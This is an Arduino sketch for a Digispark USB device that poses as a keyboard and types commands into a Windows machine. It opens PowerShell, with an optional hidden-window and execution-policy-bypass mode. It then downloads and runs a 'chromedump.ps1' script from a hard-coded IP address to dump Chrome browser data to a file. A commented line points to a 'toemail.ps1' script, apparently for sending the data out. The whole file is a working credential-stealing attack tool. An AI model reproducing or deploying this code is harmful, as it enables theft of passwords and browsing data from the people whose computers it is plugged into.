#include "DigiKeyboard.h"
 
void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}

//uncomment to run live
  //char mode[] = "powershell -nop -win h -noni -exec bypass";
  char mode[] = "powershell";
  char separator[] = "exit";
//end live
 
void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.println("(New-Object Net.WebClient).DownloadString('http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/chromedump.ps1'); chromedump -OutFile '$env:userprofile\\ChromeDump.txt'");
  DigiKeyboard.print("wget http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/chromedump.ps1 -OutFile $env:userprofile\\chromedump.ps1; start-process powershell.exe $env:userprofile\\chromedump.ps1 -OutFile '$env:userprofile\\ChromeDump.txt'; stop-process -Id $PID");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //DigiKeyboard.println("(New-Object Net.WebClient).DownloadString('http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/toemail.ps1')");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2500);
   
  blinkLed();
}

void blinkLed()
{
  while (true) {
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
